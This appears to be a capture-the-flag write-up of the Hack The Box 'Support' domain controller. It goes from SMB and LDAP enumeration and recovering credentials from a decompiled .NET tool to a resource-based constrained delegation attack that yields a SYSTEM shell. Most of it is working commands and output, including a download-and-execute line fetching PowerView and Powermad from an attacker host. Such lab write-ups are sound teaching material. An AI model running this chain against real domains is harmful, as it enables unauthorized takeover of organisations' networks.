---
layout: default
---

# Support

# Enumeration

IP → 10.10.11.174

Port scan reported the following opened ports.

```python
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack
88/tcp    open  kerberos-sec     syn-ack
135/tcp   open  msrpc            syn-ack
139/tcp   open  netbios-ssn      syn-ack
389/tcp   open  ldap             syn-ack
445/tcp   open  microsoft-ds     syn-ack
464/tcp   open  kpasswd5         syn-ack
593/tcp   open  http-rpc-epmap   syn-ack
636/tcp   open  ldapssl          syn-ack
3268/tcp  open  globalcatLDAP    syn-ack
3269/tcp  open  globalcatLDAPssl syn-ack
5985/tcp  open  wsman            syn-ack
9389/tcp  open  adws             syn-ack
49664/tcp open  unknown          syn-ack
49668/tcp open  unknown          syn-ack
49674/tcp open  unknown          syn-ack
49679/tcp open  unknown          syn-ack
49703/tcp open  unknown          syn-ack
63100/tcp open  unknown          syn-ack
```

To obtain the name of the machine and the domain we can un crackmapexec.

```python
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ crackmapexec smb 10.10.11.174
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
```

## Port 53

- transfer zone not available

```python
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ dig ANY support.htb @10.10.11.174           

; <<>> DiG 9.18.16-1-Debian <<>> ANY support.htb @10.10.11.174
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 40503
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;support.htb.                   IN      ANY

;; ANSWER SECTION:
support.htb.            600     IN      A       10.10.11.174
support.htb.            3600    IN      NS      dc.support.htb.
support.htb.            3600    IN      SOA     dc.support.htb. hostmaster.support.htb. 105 900 600 86400 3600

;; ADDITIONAL SECTION:
dc.support.htb.         3600    IN      A       10.10.11.174

;; Query time: 48 msec
;; SERVER: 10.10.11.174#53(10.10.11.174) (TCP)
;; WHEN: Wed Nov 29 06:45:59 CET 2023
;; MSG SIZE  rcvd: 136
```

```python
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ dig axfr support.htb @10.10.11.174

; <<>> DiG 9.18.16-1-Debian <<>> axfr support.htb @10.10.11.174
;; global options: +cmd
; Transfer failed.
```

## Port 135

- Need credentials

```python
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ rpcclient -U '%' 10.10.11.174
rpcclient $> enumdomusers
result was NT_STATUS_ACCESS_DENIED
```

## Port 139/445

- SMB
- We have access

```python
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ smbclient -L \\\\10.10.11.174\\ -N

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

In the share **support-tools** we find a lot of executables, but there is one that is odd.

```python
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ smbclient \\\\10.10.11.174\\support-tools
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 19:01:06 2022
  ..                                  D        0  Sat May 28 13:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 13:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 13:19:55 2022
  putty.exe                           A  1273576  Sat May 28 13:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 13:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 19:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 13:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 13:19:43 2022
```

We can try to decompile the .exe and see if can check the source code.

# Foothold

## Decompiling the .NET application

For this we can use **DNSpy**. Once it is decompilated we can see all their functions, and it seems that this binary seeks a user using ldap queries.

```python
public LdapQuery()
		{
			string password = Protected.getPassword();
			this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			this.entry.AuthenticationType = AuthenticationTypes.Secure;
			this.ds = new DirectorySearcher(this.entry);
		}
```

The user is **support\\ldap** but the password we don’t know yet. If we search more in the binary we will find the encrypted password.

```python
static Protected()
{
	Protected.enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
	Protected.key = Encoding.ASCII.GetBytes("armando");
}
```

To know the plain text password there are some thing we can do:

- Debug the binary and set a breakpoint to read the password as a variable
- Lunch the query and inspect it with wireshark
- Since we have the chiper text, the key and the algorithm to decrypt it, we should be able to use Python to replicate the algorithm.

The fastest way is to use the debugger that comes with DNSpy and set a breakpoint. With this we obtain the credentials `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz` , which are valid.

## Seeking further into LDAP

This user must have privileges to access ldap so lets try to find useful information there. If we dump the entire ldap tree we can use grep to search for uncommon things.

```python
ldapsearch -H ldap://10.10.11.174 -b "DC=support,DC=htb" -U ldap -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' > ldap_dumped
```

```python
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ cat ldap_dumped | grep -i -A28 'CN=Users,DC=support,DC=htb' | grep -vEw 'dn|objectClass|objectClass|objectClass|objectClass|cn|sn|c|l|st|postalCode|givenName|distinguishedName|instanceType|whenCreated|whenChanged|uSNCreated|uSNChanged|company|streetAddress|name|objectGUID|userAccountControl|badPwdCount|codePage|countryCode|badPasswordTime|lastLogoff|lastLogon|pwdLastSet|primaryGroupID|objectSid|accountExpires|logonCount|sAMAccountName|sAMAccountType|objectCategory|dSCorePropagationData|dSCorePropagationData|mail'
```

This query will filter all the users and show strange lines, doing this we find a field that is not common.

```python
info: Ironside47pleasure40Watchful
```

We find something that may be a password for the user `support` .

```python
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ crackmapexec smb 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'        
SMB         10.10.11.174    445    DC               [*] Windows 10.0 Build 20348 x64 (name:DC) (domain:support.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.174    445    DC               [+] support.htb\support:Ironside47pleasure40Watchful 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ crackmapexec winrm 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
SMB         10.10.11.174    5985   DC               [*] Windows 10.0 Build 20348 (name:DC) (domain:support.htb)
HTTP        10.10.11.174    5985   DC               [*] http://10.10.11.174:5985/wsman
WINRM       10.10.11.174    5985   DC               [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

WE have valid credentials `support:Ironside47pleasure40Watchful` .

Since this new user is part of the remote management users we can remotely to the machine.

```powershell
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ evil-winrm -i 10.10.11.174 -u 'support' -p 'Ironside47pleasure40Watchful'
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\support\Documents>
```

# Privilege escalation

Checking the groups of our owned user, we can see that are part of Shared Support Accounts. If we use bloodhound to enumerate de domain, we will see that members of this group have the right GenericAll over the DC. 

![Untitled](Support%20ea09600bc5824f3b843ad072ab8355d3/Untitled.png)

This let us perform a **Resource Based Constrained Delegation**. 

This attack allow us to impersonate any user of the domain in the machine we have privilege to write on. In this attack we will modify a constrain in the DC which will allow a new machine account created by us to impersonate any user we want in the DC.

First we import the necessary modules.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> iex (IWR http://10.10.14.4/PowerView.ps1 -UseBasicParsing)
*Evil-WinRM* PS C:\Users\support\Documents> iex (IWR http://10.10.14.4/Powermad.ps1 -UseBasicParsing)
```

Now we create the machine and retrieve its SID.

```powershell
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
[+] Machine account attackersystem added
*Evil-WinRM* PS C:\Users\support\Documents> $ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

Now we prepare the statements to enable the impersonation in the DC.

```python
*Evil-WinRM* PS C:\Users\support\Documents> $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
*Evil-WinRM* PS C:\Users\support\Documents> $SDBytes = New-Object byte[] ($SD.BinaryLength)
*Evil-WinRM* PS C:\Users\support\Documents> $SD.GetBinaryForm($SDBytes, 0)
```

Now we modify the constrain **msds-allowedtoactonbehalfofotheridentity** to allow our new machine account to impersonate any user in the machine we have write privilege writes on.

 

```python
*Evil-WinRM* PS C:\Users\support\Documents> $TargetComputer="DC"
*Evil-WinRM* PS C:\Users\support\Documents> Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

Once all this is done we will request a Silver ticket for the service we want in the machine we are taking over.

```powershell
.\rubeus.exe hash /password:Summer2018!
.\rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb
[*] Impersonating user 'administrator' to target SPN 'cifs/dc.support.htb'
[*] Building S4U2proxy request for service: 'cifs/dc.support.htb'
[*] Using domain controller: dc.support.htb (::1)
[*] Sending S4U2proxy request to domain controller ::1:88
[+] S4U2proxy success!
[*] base64(ticket.kirbi) for SPN 'cifs/dc.support.htb':

      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
*Evil-WinRM* PS C:\Users\support\Documents>
```

Now back in out attacking machine we have to convert the ticket to one that can be used with impacket suite.

```powershell
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ cat aux.ticket| tr -d ' '  | tr -d '\n' | base64 -d > admin.ticket
```

```powershell
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ impacket-ticketConverter admin.ticket admin.ccache                
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] converting kirbi to ccache...
[+] done
```

Now we should be able to user psexec to obtain a shell.

```powershell
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ KRB5CCNAME=admin.ccache impacket-psexec support.htb/Administrator@DC -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_PREAUTH_FAILED(Pre-authentication information was invalid)
```

The reason why this has failed is because we didn’t specify the correct name when requesting the ticket.

- Bad → cifs/dc.support.htb

```powershell
.\rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/dc.support.htb
```

- Correct → cifs/DC

```powershell
.\rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/DC
```

Now we have the shell.

```powershell
┌──(kali㉿kali)-[~/machines/windows/support]
└─$ KRB5CCNAME=admin.ccache impacket-psexec support.htb/Administrator@DC -k -no-pass
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Requesting shares on DC.....
[*] Found writable share ADMIN$
[*] Uploading file SUcDRXed.exe
[*] Opening SVCManager on DC.....
[*] Creating service lBKn on DC.....
[*] Starting service lBKn.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.20348.859]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32>
```